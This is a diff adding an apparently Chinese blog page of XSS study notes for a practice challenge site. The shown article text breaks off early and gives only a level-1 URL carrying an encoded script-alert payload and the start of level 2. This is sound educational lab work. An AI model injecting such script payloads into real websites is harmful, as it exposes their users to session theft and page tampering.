@@ -1,0 +1,1287 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>XSS学习记录 | prontosil&#39;s Blog</title>
+  <meta name="keywords" content=" XSS ">
+  <meta name="description" content="XSS学习记录 | prontosil&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="XSS挑战(突然发现这个平台有bug，只需要在控制台alert(1)即可。。) level1 http:&#x2F;&#x2F;test.ctf8.com&#x2F;level1.php?name&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3Elevel2 没有找到和&amp;lt;&#x2F;h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS学习记录">
+<meta property="og:url" content="http://prontosil.com/posts/88edfa78/index.html">
+<meta property="og:site_name" content="prontosil&#39;s Blog">
+<meta property="og:description" content="XSS挑战(突然发现这个平台有bug，只需要在控制台alert(1)即可。。) level1 http:&#x2F;&#x2F;test.ctf8.com&#x2F;level1.php?name&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3Elevel2 没有找到和&amp;lt;&#x2F;h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://prontosil.com/posts/88edfa78/1581324449393.png">
+<meta property="og:image" content="http://prontosil.com/posts/88edfa78/1582880021264.png">
+<meta property="og:image" content="http://prontosil.com/posts/88edfa78/1582896974234.png">
+<meta property="og:image" content="http://prontosil.com/posts/88edfa78/1582897922738.png">
+<meta property="og:image" content="http://prontosil.com/posts/88edfa78/XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874638329.png">
+<meta property="og:image" content="http://prontosil.com/posts/88edfa78/XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874680248.png">
+<meta property="og:image" content="http://prontosil.com/posts/88edfa78/XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874701778.png">
+<meta property="article:published_time" content="2020-03-10T07:11:49.000Z">
+<meta property="article:modified_time" content="2020-03-10T07:16:09.089Z">
+<meta property="article:author" content="prontosil">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://prontosil.com/posts/88edfa78/1581324449393.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//https-prontosil-club.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>prontosil</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/xinyongpeng" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+        <a title="jianshu" href="https://www.jianshu.com/u/7b4cb9cdc0c8" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-jianshu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="zhihu" href="https://www.zhihu.com/people/he-yan-52-34" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-zhihu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="csdn" href="https://blog.csdn.net/qq_41645130" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-csdn"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1365155759@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1365155759&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(45)</small></div></li>
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small>(9)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(12)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="编程">编程<small>(11)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="生活">生活<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="45">
+<input type="hidden" id="yelog_site_word_count" value="32.9k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://xingherumeng.top/">星河入梦</a></li>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+            <li><a target="_blank" href="https://r0co.top/">r0co</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">HTB</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">靶机</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">原型链污染</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">XSS</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxe</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xml</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">java</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">反序列化</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">函数</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">字符串</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">bytes</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">文档</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SQL</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">文件上传</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">游戏</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">cms</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">vulnhub</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">域名</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">隐写</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">网站</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">dig</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">比赛</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">tcpdump</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">提权</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">kill</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxd</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">hexdump</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">leetcode</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">汇编</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">dosbox</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Apache</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">RCE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SSI</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">截断</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CSP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">实验</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="CTF "
+           href="/posts/f364e7d6/"
+           data-tag="网站"
+           data-author="" >
+            <span class="post-title" title="常用的网站">常用的网站</span>
+            <span class="post-date" title="2020-03-10 13:30:08">2020/03/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/70df97a2/"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="sqli-lab记录">sqli-lab记录</span>
+            <span class="post-date" title="2020-03-10 15:14:56">2020/03/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/88edfa78/"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="XSS学习记录">XSS学习记录</span>
+            <span class="post-date" title="2020-03-10 15:11:49">2020/03/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/1e1d8fb4/"
+           data-tag="CSP"
+           data-author="" >
+            <span class="post-title" title="绕过CSP">绕过CSP</span>
+            <span class="post-date" title="2020-03-10 15:10:40">2020/03/10</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/e247dc77/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="python字符串的一些小坑">python字符串的一些小坑</span>
+            <span class="post-date" title="2020-03-10 14:03:41">2020/03/10</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/11fc1d3/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="tornado框架">tornado框架</span>
+            <span class="post-date" title="2020-03-10 13:26:44">2020/03/10</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/70fc8f0c/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="jwt学习笔记">jwt学习笔记</span>
+            <span class="post-date" title="2020-03-10 13:24:10">2020/03/10</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/bce54486/"
+           data-tag="文档"
+           data-author="" >
+            <span class="post-title" title="requests文档阅读笔记">requests文档阅读笔记</span>
+            <span class="post-date" title="2020-03-10 13:20:52">2020/03/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/2f3193b1/"
+           data-tag="比赛"
+           data-author="" >
+            <span class="post-title" title="战疫分享赛wp">战疫分享赛wp</span>
+            <span class="post-date" title="2020-03-10 09:15:07">2020/03/10</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/137d2c1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="命令执行进阶">命令执行进阶</span>
+            <span class="post-date" title="2020-03-10 09:08:59">2020/03/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/1cc6bf70/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="绕过disable_function总结">绕过disable_function总结</span>
+            <span class="post-date" title="2020-03-08 14:17:38">2020/03/08</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/ea51772/"
+           data-tag="实验"
+           data-author="" >
+            <span class="post-title" title="网络侦察实验">网络侦察实验</span>
+            <span class="post-date" title="2020-03-05 14:55:44">2020/03/05</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/bdd52bdc/"
+           data-tag="反序列化,CTF"
+           data-author="" >
+            <span class="post-title" title="反序列化导致字符的逃逸">反序列化导致字符的逃逸</span>
+            <span class="post-date" title="2020-03-05 07:53:29">2020/03/05</span>
+        </a>
+        
+        <a  class="生活 "
+           href="/posts/61b7ba22/"
+           data-tag="游戏"
+           data-author="" >
+            <span class="post-title" title="文明六玩后感">文明六玩后感</span>
+            <span class="post-date" title="2020-03-04 12:04:35">2020/03/04</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/24a0544e/"
+           data-tag="靶机,vulnhub"
+           data-author="" >
+            <span class="post-title" title="vulnhub靶机渗透-DC-8">vulnhub靶机渗透-DC-8</span>
+            <span class="post-date" title="2020-03-02 21:02:00">2020/03/02</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/73230382/"
+           data-tag="HTB,靶机"
+           data-author="" >
+            <span class="post-title" title="HTB mango靶机实战">HTB mango靶机实战</span>
+            <span class="post-date" title="2020-02-29 17:04:17">2020/02/29</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/d5bfc2a3/"
+           data-tag="HTB,靶机"
+           data-author="" >
+            <span class="post-title" title="HTB Traverxec靶机实战">HTB Traverxec靶机实战</span>
+            <span class="post-date" title="2020-02-29 16:55:13">2020/02/29</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/a99288c/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="每天一道leetcode-最长回文字串">每天一道leetcode-最长回文字串</span>
+            <span class="post-date" title="2020-02-10 22:26:19">2020/02/10</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/e4ff8385/"
+           data-tag="靶机"
+           data-author="" >
+            <span class="post-title" title="vulnhub靶机渗透-Connectthedots">vulnhub靶机渗透-Connectthedots</span>
+            <span class="post-date" title="2020-02-10 18:49:37">2020/02/10</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/fcea4f6a/"
+           data-tag="靶机"
+           data-author="" >
+            <span class="post-title" title="vulnhub靶机渗透-HackInOs">vulnhub靶机渗透-HackInOs</span>
+            <span class="post-date" title="2020-02-10 18:49:18">2020/02/10</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/da023d5c/"
+           data-tag="Linux,kill"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-kill">每天一个Linux命令-kill</span>
+            <span class="post-date" title="2020-02-07 17:30:24">2020/02/07</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/ebe7281d/"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Linux命令trick">Linux命令trick</span>
+            <span class="post-date" title="2020-02-07 09:10:26">2020/02/07</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/4d0603d0/"
+           data-tag="靶机"
+           data-author="" >
+            <span class="post-title" title="vulnhub靶机渗透-WebDeveloper">vulnhub靶机渗透-WebDeveloper</span>
+            <span class="post-date" title="2020-02-06 21:42:17">2020/02/06</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/9cc474ce/"
+           data-tag="tcpdump,提权"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-tcpdump">每天一个Linux命令-tcpdump</span>
+            <span class="post-date" title="2020-02-06 20:33:51">2020/02/06</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/3b32f749/"
+           data-tag="隐写"
+           data-author="" >
+            <span class="post-title" title="如何保护版权">如何保护版权</span>
+            <span class="post-date" title="2020-02-06 11:19:57">2020/02/06</span>
+        </a>
+        
+        <a  class="生活 "
+           href="/posts/69f21310/"
+           data-tag="游戏"
+           data-author="" >
+            <span class="post-title" title="冰气时代玩后感">冰气时代玩后感</span>
+            <span class="post-date" title="2020-02-06 10:39:33">2020/02/06</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/75a61507/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="python文件">python文件</span>
+            <span class="post-date" title="2020-02-06 10:39:16">2020/02/06</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/25e898cd/"
+           data-tag="字符串,bytes"
+           data-author="" >
+            <span class="post-title" title="python3字符串">python3字符串</span>
+            <span class="post-date" title="2020-02-06 10:39:14">2020/02/06</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/a0911a0b/"
+           data-tag="HTB,靶机"
+           data-author="" >
+            <span class="post-title" title="HTB Obscurity靶机实战">HTB Obscurity靶机实战</span>
+            <span class="post-date" title="2020-02-05 21:50:54">2020/02/05</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/70b2e753/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="docker基本使用指南">docker基本使用指南</span>
+            <span class="post-date" title="2020-02-02 22:22:30">2020/02/02</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/6cc1a5d6/"
+           data-tag="汇编"
+           data-author="" >
+            <span class="post-title" title="汇编从入门到入土二">汇编从入门到入土二</span>
+            <span class="post-date" title="2020-02-02 22:16:48">2020/02/02</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/57418b7f/"
+           data-tag="汇编,dosbox"
+           data-author="" >
+            <span class="post-title" title="汇编从入门到入土一">汇编从入门到入土一</span>
+            <span class="post-date" title="2020-02-01 22:02:40">2020/02/01</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/728b20a1/"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="代码审计初尝">代码审计初尝</span>
+            <span class="post-date" title="2020-02-01 10:31:26">2020/02/01</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/2e8d4a2a/"
+           data-tag="xxd,hexdump"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-xxd">每天一个Linux命令-xxd</span>
+            <span class="post-date" title="2020-01-31 19:35:51">2020/01/31</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/2e6a5f8a/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="每天以一道leetcode-链表题">每天以一道leetcode-链表题</span>
+            <span class="post-date" title="2020-01-31 19:35:34">2020/01/31</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/1f38a4f2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="safeharbor靶机渗透">safeharbor靶机渗透</span>
+            <span class="post-date" title="2020-01-31 19:35:18">2020/01/31</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/5877398d/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="upload-lab做题笔记">upload-lab做题笔记</span>
+            <span class="post-date" title="2020-01-30 21:17:58">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/3d16ce36/"
+           data-tag="php,函数"
+           data-author="" >
+            <span class="post-title" title="php常用函数">php常用函数</span>
+            <span class="post-date" title="2020-01-30 17:15:35">2020/01/30</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/becfc22d/"
+           data-tag="文件上传,Apache,RCE,SSI,截断"
+           data-author="" >
+            <span class="post-title" title="漏洞复现-Apache SSI远程命令执行">漏洞复现-Apache SSI远程命令执行</span>
+            <span class="post-date" title="2020-01-30 10:48:35">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/734660ee/"
+           data-tag="leetcode"
+           data-author="" >
+            <span class="post-title" title="每天一道leetcode-数组题">每天一道leetcode-数组题</span>
+            <span class="post-date" title="2020-01-30 10:45:29">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/f1616294/"
+           data-tag="Linux,dig"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-dig">每天一个Linux命令-dig</span>
+            <span class="post-date" title="2020-01-30 10:45:02">2020/01/30</span>
+        </a>
+        
+        <a  class="生活 "
+           href="/posts/b69cd839/"
+           data-tag="域名"
+           data-author="" >
+            <span class="post-title" title="域名解析记录">域名解析记录</span>
+            <span class="post-date" title="2020-01-30 10:40:56">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/5d5d07b8/"
+           data-tag="JavaScript,原型链污染"
+           data-author="" >
+            <span class="post-title" title="JavaScript原型链污染">JavaScript原型链污染</span>
+            <span class="post-date" title="2020-01-30 09:13:31">2020/01/30</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/21b61fbe/"
+           data-tag="java,反序列化"
+           data-author="" >
+            <span class="post-title" title="java审计笔记">java审计笔记</span>
+            <span class="post-date" title="2020-01-30 09:05:39">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/2e545689/"
+           data-tag="xxe,xml"
+           data-author="" >
+            <span class="post-title" title="XXE复习">XXE复习</span>
+            <span class="post-date" title="2020-01-30 07:48:51">2020/01/30</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-XSS学习记录" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">XSS学习记录</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">XSS</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-03-10 15:16:09'>2020-03-10 15:11</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:4.2k</span>
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS挑战"><span class="toc-text">XSS挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3-js事件绕过"><span class="toc-text">level3 js事件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5-a标签绕过"><span class="toc-text">level5 a标签绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level6"><span class="toc-text">level6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7"><span class="toc-text">level7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level8"><span class="toc-text">level8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level9"><span class="toc-text">level9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level10"><span class="toc-text">level10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level11"><span class="toc-text">level11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level12"><span class="toc-text">level12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level13"><span class="toc-text">level13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level14"><span class="toc-text">level14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level15"><span class="toc-text">level15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level16"><span class="toc-text">level16</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prompt1-to-win"><span class="toc-text">prompt1 to win</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0"><span class="toc-text">0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-text">6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9"><span class="toc-text">9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A"><span class="toc-text">A</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS基础知识"><span class="toc-text">XSS基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简单地XSS接收平台"><span class="toc-text">简单地XSS接收平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#从浏览器解码看xss"><span class="toc-text">从浏览器解码看xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#html编码解码"><span class="toc-text">html编码解码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript编码解码"><span class="toc-text">JavaScript编码解码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL编码解码"><span class="toc-text">URL编码解码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-payload判断是否执行练习"><span class="toc-text">XSS payload判断是否执行练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-协议被编码导致无法执行"><span class="toc-text">1 协议被编码导致无法执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-协议被编码，同1"><span class="toc-text">3 协议被编码，同1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1"><span class="toc-text">5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-同5-无法执行"><span class="toc-text">6  同5 无法执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7"><span class="toc-text">7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8"><span class="toc-text">8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-1"><span class="toc-text">9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10"><span class="toc-text">10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-同8，关键字符被编码"><span class="toc-text">11 同8，关键字符被编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-由于解码是字符串导致无法执行"><span class="toc-text">12 由于解码是字符串导致无法执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-同8无法执行"><span class="toc-text">14 同8无法执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15"><span class="toc-text">15</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h2><p>(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)</p>
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><pre><code> http://test.ctf8.com/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><pre><code> 没有找到和&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;相关的结果.</code></pre><p>但是</p>
